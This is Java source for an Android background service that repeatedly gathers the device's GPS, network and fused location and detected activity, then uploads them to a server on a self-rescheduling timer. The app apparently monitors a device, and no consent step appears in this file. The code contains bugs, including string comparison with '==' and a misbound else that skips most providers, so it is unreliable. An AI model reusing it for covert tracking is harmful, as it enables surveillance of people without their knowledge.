package com.inet.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.GpsSatellite;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.inet.android.request.AppConstants;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * LocationTracker class is designed to monitoring location
 * 
 * @author johny homicide
 * 
 */
public class LocationTracker extends Service implements GpsStatus.Listener,
		LocationListener, GoogleApiClient.ConnectionCallbacks,
		GoogleApiClient.OnConnectionFailedListener,
		com.google.android.gms.location.LocationListener {

	private static final String TAG = LocationTracker.class.getSimpleName()
			.toString();
	private LocationValue locationValue;;
	private static final int SERVICE_REQUEST_CODE = 15;
	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 0; // 100
	private static final int MILLISECONDS_PER_SECOND = 1000;
	private static final int MILLISECONDS_PER_MINUTE = 60 * MILLISECONDS_PER_SECOND;
	private static final int FIVE = 5;

	// Update frequency in milliseconds
	private static final long UPDATE_INTERVAL_IN_FIVE_MINUTE = MILLISECONDS_PER_MINUTE
			* FIVE;

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES; // get minute
	// Declaring a Location Manager
	protected LocationManager locationManager;
	private LocationRequest mLocationRequest;
	private GoogleApiClient googleApiClient;

	// flag for GPS status
	private boolean isGPSEnabled = false;
	// flag for network status
	private boolean isNetworkEnabled = false;
	// flag for GPS status
	private Context mContext;
	private Location location; // location
	private int geoMode = -1;

	@Override
	public void onCreate() {
		Logging.doLog(TAG, "LocationTracker onCreate()",
				"LocationTracker onCreate()");
		mContext = getApplicationContext();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mContext = getApplicationContext();
		int timeUp = AppSettings.getSetting(
				AppConstants.TYPE_LOCATION_TRACKER_REQUEST, this);
		geoMode = AppSettings.getSetting(AppConstants.LOCATION_TRACKER_MODE,
				this);
		locationManager = (LocationManager) mContext
				.getSystemService(LOCATION_SERVICE);

		if (timeUp == 0) {
			Logging.doLog(TAG, "Location Stop", "Location Stop");
			stopLocationManager();
			stopPlayService();
			return 0;
		}
		setCalendar(FIVE);

		MIN_TIME_BW_UPDATES = timeUp * MILLISECONDS_PER_MINUTE;
		Logging.doLog(TAG, "onStartCommand LocationTracker "
				+ MIN_TIME_BW_UPDATES, "onStartCommand LocationTracker "
				+ MIN_TIME_BW_UPDATES);

		// ----------is work ---------------------------------------------------

		locationValue = new LocationValue();

		if (!servicesAvailable()) {
			Logging.doLog(TAG, "!servicesAvailable() ", "!servicesAvailable() ");
			stopPlayService();
			setOnLocationManager();
		} else {
			Logging.doLog(TAG, "createApiGoogle() ", "createApiGoogle() ");
			stopLocationManager();
			createApiGoogle();

		}
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	private void setCalendar(int timeUp) {
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LocationTracker.class),
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
	}

	private Location setOnLocationManager() {
		try {
			Logging.doLog(TAG, "GetLocation ", "GetLocation ");

			// --------------- getting GPS status-----------------
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);

			// --------------- getting network status-------------
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

			// --------------- getting geo_mode ------------------

			if (geoMode == 1 && isGPSEnabled) {
				Logging.doLog(TAG, "GPS set true ", "GPS set true ");
				locationValue.setGPSLocation(true);
			} else {
				locationValue.setGPSLocation(false);
				locationManager.removeGpsStatusListener(this);
			}

			// --------------- getting location method-------------

			if (!locationValue.getGPSLocation() && !isNetworkEnabled) {
				// no network provider is enabled
				Log.d(TAG, "!isGPS&&isNetwork ");
				return null;
			} else {
				if (locationValue.getGPSLocation() == true) {
					Log.d(TAG, "GPS Enabled");
					locationManager.addGpsStatusListener(this);
					gpsLoc();
				}
				if (isNetworkEnabled) {
					if (isOnline() == true) {
						Log.d(TAG, "Network isOnline ");
						netLoc();

					}
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		getLast();
		return location;
	}

	// -----------------search last coordinates-----------------------

	private void getLast() {
		SimpleDateFormat TIMESTAMP = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss", Locale.getDefault());
		Location bestResult = null;
		String bestProvider = null;
		double latitude = 0; // latitude
		double longitude = 0; // longitude

		float accuracy;
		long time;
		long bestTime = 0;
		float bestAccuracy = 1000;
		long minTime = 0;
		List<String> matchingProviders = locationManager.getAllProviders();
		matchingProviders.add("GooglePlayService");
		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan "
				+ matchingProviders.toString());

		for (String provider : matchingProviders) {
			if (provider.equals("GooglePlayService"))
				if (googleApiClient != null && locationValue.isLocationClient())
					location = LocationServices.FusedLocationApi
							.getLastLocation(googleApiClient);
				else
					location = locationManager.getLastKnownLocation(provider);

			if (location != null) {

				accuracy = location.getAccuracy();
				time = location.getTime();

				// Выводим Дату по шаблону
				String date2 = TIMESTAMP.format(time);
				Logging.doLog(TAG, "last update " + provider + " " + date2
						+ " accuracy" + accuracy, "last update " + provider
						+ " " + date2 + " accuracy" + accuracy);
				long timeSys = System.currentTimeMillis();
				minTime = timeSys - UPDATE_INTERVAL_IN_FIVE_MINUTE;
				if ((time > minTime && accuracy < bestAccuracy)) {
					bestResult = location;
					longitude = bestResult.getLongitude();
					latitude = bestResult.getLatitude();
					bestAccuracy = accuracy;
					bestTime = time;
					bestProvider = provider;
				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
						&& time > bestTime) {
					bestResult = location;
					bestTime = time;
					bestProvider = provider;
					bestAccuracy = accuracy;
					longitude = bestResult.getLongitude();
					latitude = bestResult.getLatitude();
				}
			}

		}
		Logging.doLog(TAG, "bestProvider " + bestProvider + " best time: "
				+ bestTime + " best accuracy " + bestAccuracy, "bestProvider "
				+ bestProvider + " best accuracy" + bestAccuracy);

		locationValue.setProvider(bestProvider);
		locationValue.setLatitude(latitude);
		locationValue.setLongitude(longitude);
		locationValue.setAccuracy(bestAccuracy);
		sendLoc();

	}

	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnectedOrConnecting()) {
			return true;
		}
		return false;
	}

	private void netLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(
				LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
	}

	private void gpsLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
				MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
	}

	private void sendLoc() {
		if (Double.toString(locationValue.getLatitude()) == "0.0"
				&& Double.toString(locationValue.getLongitude()) == "0.0") {
			Logging.doLog(TAG, "equals = 0.0", "equals = 0.0");

		} else {
			// -------send location----------------------------
			// String activity = sp.getString("activity", "0");
			String activity = RecognitionDevService.getActivityDevice();
			Logging.doLog(TAG, "activity" + activity, "activity" + activity);
			RequestParams params = new RequestParams();
			if (activity != null && !activity.equals(""))
				params.put("data[][info][ttl]", locationValue.getProvider()
						+ " " + " " + activity);
			if (activity != null && !activity.equals(""))
				params.put("data[][info][ttl]", locationValue.getProvider()
						+ " " + " " + activity);
			else
				params.put("data[][info][ttl]", locationValue.getProvider());
			params.put("data[][info][data]", locationValue.getLatitude() + ","
					+ locationValue.getLongitude());
			params.put("data[][info][accuracy]",
					String.format("%.02f", locationValue.getAccuracy()));

			params.put("data[][time]", ConvertDate.logTime());
			params.put("data[][type]", Integer
					.toString(AppConstants.TYPE_LOCATION_TRACKER_REQUEST));
			params.put("key", System.currentTimeMillis());

			Log.d(TAG, params.toString());

			DataRequest dataReq = new DataRequest(mContext);
			dataReq.sendRequest(params);

		}
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		if (location != null) {
			if (location.getProvider().equals("fused"))
				locationValue.setProvider("GooglePlayService");
			else
				locationValue.setProvider(location.getProvider());
			locationValue.setLatitude(location.getLatitude());
			locationValue.setLongitude(location.getLongitude());
			locationValue.setAccuracy(location.getAccuracy());
		}

	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		/* This is called when the GPS status alters */
		switch (status) {
		case LocationProvider.OUT_OF_SERVICE:
			Logging.doLog(TAG, "Status Changed: Out of Service",
					"Status Changed: Out of Service");

			break;
		case LocationProvider.TEMPORARILY_UNAVAILABLE:
			Logging.doLog(TAG, "Status Changed: Temporarily Unavailable",
					"Status Changed: Temporarily Unavailable");

			break;
		case LocationProvider.AVAILABLE:
			Logging.doLog(TAG, "Status Changed: Available",
					"Status Changed: Available");
			break;
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onGpsStatusChanged(int event) {
		// TODO Автоматически созданная заглушка метода
		GpsStatus status = locationManager.getGpsStatus(null);

		switch (event) {
		case GpsStatus.GPS_EVENT_FIRST_FIX:
			Logging.doLog(TAG, "GPS_EVENT_FIRST_FIX", "GPS_EVENT_FIRST_FIX");
			if (status.getTimeToFirstFix() < 1000 * 20)
				locationValue.setGPSFix(true);
			else
				return;
			break;
		case GpsStatus.GPS_EVENT_SATELLITE_STATUS:
			if (locationValue.getGPSFix() == true) {
				Logging.doLog(TAG, "GPS_EVENT_SATELLITE_STATUS",
						"GPS_EVENT_SATELLITE_STATUS");

				Iterable<GpsSatellite> satellites = status.getSatellites();

				Iterator<GpsSatellite> sats = satellites.iterator();
				int i = 0;

				while (sats.hasNext()) {
					sats.next();
					i += 1;
				}
				locationValue.setSatsAvailable(i);
				Logging.doLog(TAG,
						Integer.toString(locationValue.getSatsAvailable()),
						Integer.toString(locationValue.getSatsAvailable()));

				if (locationValue.getSatsAvailable() >= 4) {
					Logging.doLog(TAG, "Sats >= 4", "Sats >= 4");
					locationValue.setGPSLoc(true);
				}
			}
			break;
		case GpsStatus.GPS_EVENT_STARTED:
			Logging.doLog(TAG, "GPS_EVENT_STARTED", "GPS_EVENT_STARTED");

			break;
		case GpsStatus.GPS_EVENT_STOPPED:
			Logging.doLog(TAG, "GPS_EVENT_STOPPED", "GPS_EVENT_STOPPED");
			locationValue.setGPSFix(false);
			break;
		}
	}

	@Override
	public void onConnectionFailed(ConnectionResult connectionResult) {
		// TODO Auto-generated method stub
		Logging.doLog(TAG, "onConnectionFailed: " + connectionResult,
				"onConnectionFailed: " + connectionResult);
		locationValue.setLocationClient(false);

		if (connectionResult.hasResolution()) {
			// Google Play services can fix the issue
			// e.g. the user needs to enable it, updates to latest version
			// or the user needs to grant permissions to it
			locationValue.setLocationClient(false);
		} else {
			// Google Play services has no idea how to fix the issue
		}
	}

	@Override
	public void onConnected(Bundle arg0) {
		// TODO Auto-generated method stub
		Logging.doLog(TAG, "Connected to Google Play Services: " + arg0,
				"Connected to Google Play Services: " + arg0);
		mLocationRequest = LocationRequest.create()
				.setInterval(MIN_TIME_BW_UPDATES).setFastestInterval(5000L)
				.setSmallestDisplacement(10.0F);
		Logging.doLog(TAG, "geomode setPrioity: " + geoMode,
				"geomode setPrioity: " + geoMode);
		if (geoMode == 1)
			mLocationRequest
					.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
		else
			mLocationRequest
					.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);

		Logging.doLog(TAG, "connect locationClient " + googleApiClient,
				"connect locationClient " + googleApiClient);
		if (googleApiClient != null)
			if (googleApiClient.isConnected()) {
				LocationServices.FusedLocationApi.requestLocationUpdates(
						googleApiClient, mLocationRequest, this);
				locationValue.setLocationClient(true);
			}
		getLast();

	}

	private void createApiGoogle() {
		Logging.doLog(TAG, "createApiGoogle", "createApiGoogle");

		googleApiClient = new GoogleApiClient.Builder(this)
				.addApi(LocationServices.API).addConnectionCallbacks(this)
				.addOnConnectionFailedListener(this).build();
		googleApiClient.connect();
	}

	private boolean servicesAvailable() {

		int resultCode = GooglePlayServicesUtil
				.isGooglePlayServicesAvailable(this);
		if (ConnectionResult.SUCCESS == resultCode) {
			Log.d(TAG, "Google Play services is available.");
			return true;
		}
		Log.e(TAG, "Google Play services NOT available.");
		return false;
	}

	private void stopPlayService() {
		Log.d(TAG, "stopPlayService()");
		if (LocationServices.FusedLocationApi != null
				&& googleApiClient != null) {
			locationValue.setLocationClient(false);
			LocationServices.FusedLocationApi.removeLocationUpdates(
					googleApiClient, this);
			googleApiClient.disconnect();
		}
	}

	private void stopUpdateLocationPlayService() {
		Log.d(TAG, "stopPlayService()");
		if (LocationServices.FusedLocationApi != null
				&& googleApiClient != null) {
			LocationServices.FusedLocationApi.removeLocationUpdates(
					googleApiClient, this);
		}
	}

	private void stopLocationManager() {
		if (locationManager != null) {
			locationManager.removeUpdates(this);
			locationManager.removeGpsStatusListener(this);
		}
	}

	@Override
	public void onConnectionSuspended(int arg0) {
		// TODO Auto-generated method stub
		Logging.doLog(TAG, "onConnectionSuspended", "onConnectionSuspended");

		locationValue.setLocationClient(false);
		stopUpdateLocationPlayService();
	}
}
